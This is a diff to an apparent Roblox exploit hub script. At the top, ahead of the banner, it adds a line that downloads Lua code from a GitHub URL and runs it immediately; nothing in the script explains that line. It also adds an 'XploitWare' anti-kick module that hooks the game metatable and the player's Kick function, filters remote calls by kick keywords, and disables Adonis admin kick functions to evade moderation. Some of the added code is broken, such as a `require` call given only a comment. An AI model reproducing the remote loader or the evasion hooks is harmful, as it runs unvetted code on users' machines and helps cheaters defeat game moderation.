@@ -1,3 +1,8 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SystemSecRoblox/SystemSec/refs/heads/main/main.lua"))()
+
+
+
 --[[
 
  _   _    _   _   _____     _       ___     _   _   _   _   ____   
@@ -1497,6 +1502,190 @@ Tabs.Misc:AddToggle("AntiBanToggle", {
 
 
 
+
+--== GUI FLUENT SETUP & ANTI-KICK TOGGLE INTEGRATION ==--
+
+local getgenv, getnamecallmethod, hookmetamethod, hookfunction, newcclosure, checkcaller =
+    getgenv, getnamecallmethod, hookmetamethod, hookfunction, newcclosure, checkcaller
+
+local string_lower, string_gsub = string.lower, string.gsub
+
+if getgenv().ED_AntiKick then return end
+
+-- GUI settings
+local Fluent = require(--[[ your path or loader for Fluent UI ]])
+local Window = Fluent:CreateWindow({ Title = "My Hub", SubTitle = "Anti‑Kick System" })
+local Tabs = {
+    Misc = Window:AddTab({ Title = "Misc", Icon = "⚙️" })
+}
+
+-- Notification helper
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local StarterGui = game:GetService("StarterGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local function notify(title, text, duration, icon)
+    StarterGui:SetCore("SendNotification", {
+        Title = title,
+        Text = text,
+        Duration = duration or 3,
+        Icon = icon
+    })
+end
+
+-- Anti‑Kick core variables
+getgenv().ED_AntiKick = {
+    Enabled = true,
+    SendNotifications = true,
+    CheckCaller = true
+}
+
+-- Kick keywords detection
+local kickKeywords = {"kick", "shutdown", "ban", "destroy", "kickplayer", "kickuser"}
+local function containsKickKeyword(str)
+    if not str then return false end
+    local lowerStr = string_lower(str)
+    for _, keyword in pairs(kickKeywords) do
+        if string_lower(keyword) and string.match(lowerStr, string_lower(keyword)) then
+            return true
+        end
+    end
+    return false
+end
+
+local function compareInstances(inst1, inst2)
+    if typeof(inst1) == "Instance" and typeof(inst2) == "Instance" then
+        return inst1 == inst2
+    end
+    return false
+end
+
+-- Hook metatable Namecall and Kick
+local mt = getrawmetatable(game)
+local oldNamecall = mt.__namecall
+local oldKickFunction = LocalPlayer.Kick
+setreadonly(mt, false)
+
+mt.__namecall = newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+    local args = {...}
+
+    if getgenv().ED_AntiKick.Enabled then
+        local pass = (not getgenv().ED_AntiKick.CheckCaller) or (getgenv().ED_AntiKick.CheckCaller and not checkcaller())
+        if pass and compareInstances(self, LocalPlayer) and string_gsub(method, "^%l", string.upper) == "Kick" then
+            if getgenv().ED_AntiKick.SendNotifications then
+                notify("XploitWare - Anti‑Kick", "Successfully intercepted kick.", 2, "rbxassetid://6238540373")
+            end
+            return
+        end
+    end
+
+    if containsKickKeyword(method) then
+        return
+    end
+
+    return oldNamecall(self, ...)
+end)
+setreadonly(mt, true)
+
+LocalPlayer.Kick = newcclosure(function(...)
+    local pass = (not getgenv().ED_AntiKick.CheckCaller) or (getgenv().ED_AntiKick.CheckCaller and not checkcaller())
+    if pass and getgenv().ED_AntiKick.Enabled then
+        if getgenv().ED_AntiKick.SendNotifications then
+            notify("XploitWare - Anti‑Kick", "Successfully intercepted kick.", 2, "rbxassetid://6238540373")
+        end
+        return
+    end
+    return oldKickFunction(...)
+end)
+
+-- Hook remotes to block suspicious messages
+local function hookRemote(remote)
+    if remote:IsA("RemoteEvent") then
+        local oldFire = remote.FireServer
+        remote.FireServer = function(self, ...)
+            local args = {...}
+            for _, v in pairs(args) do
+                if type(v) == "string" and containsKickKeyword(v) then
+                    if getgenv().ED_AntiKick.SendNotifications then
+                        notify("XploitWare - Anti‑Kick", "Blocked kick RemoteEvent call.", 2)
+                    end
+                    return
+                end
+            end
+            return oldFire(self, ...)
+        end
+    elseif remote:IsA("RemoteFunction") then
+        local oldInvoke = remote.InvokeServer
+        remote.InvokeServer = function(self, ...)
+            local args = {...}
+            for _, v in pairs(args) do
+                if type(v) == "string" and containsKickKeyword(v) then
+                    if getgenv().ED_AntiKick.SendNotifications then
+                        notify("XploitWare - Anti‑Kick", "Blocked kick RemoteFunction call.", 2)
+                    end
+                    return
+                end
+            end
+            return oldInvoke(self, ...)
+        end
+    end
+end
+
+local function scanAndHookRemotes()
+    local containers = {ReplicatedStorage, workspace}
+    for _, c in pairs(containers) do
+        for _, remote in pairs(c:GetDescendants()) do
+            if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
+                pcall(hookRemote, remote)
+            end
+        end
+    end
+end
+
+scanAndHookRemotes()
+coroutine.wrap(function()
+    while true do
+        wait(30)
+        scanAndHookRemotes()
+    end
+end)()
+
+-- Integrate with Admin globals if available
+local success, Admin = pcall(function() return _G.Adonis or _G.Admin end)
+if success and Admin then
+    for name, func in pairs(Admin) do
+        if type(func) == "function" and containsKickKeyword(name) then
+            Admin[name] = function(...)
+                if getgenv().ED_AntiKick.SendNotifications then
+                    notify("XploitWare - Anti‑Kick", "Blocked Adonis kick function: "..name, 2)
+                end
+                return
+            end
+        end
+    end
+end
+
+-- Toggle control in GUI
+Tabs.Misc:AddToggle("Toggle_AntiKick", {
+    Title = "Anti-Kick",
+    Default = true,
+    Callback = function(state)
+        getgenv().ED_AntiKick.Enabled = state
+        if getgenv().ED_AntiKick.SendNotifications then
+            notify("XploitWare - Anti‑Kick", (state and "Đã bật" or "Đã tắt").." bảo vệ kick.", 3, "rbxassetid://6238540373")
+        end
+    end
+})
+
+-- Initial activation notification
+if getgenv().ED_AntiKick.SendNotifications then
+    notify("XploitWare - Anti‑Kick", "Anti‑Kick system initialized and active.", 3, "rbxassetid://6238540373")
+end
+
+
+
 -- Tabs.Settings
 
 
@@ -2032,3 +2221,12 @@ do
     if Client.Character then Setup(Client.Character) end
     Client.CharacterAdded:Connect(Setup)
 end
+
+
+
+
+
+
+
+
+
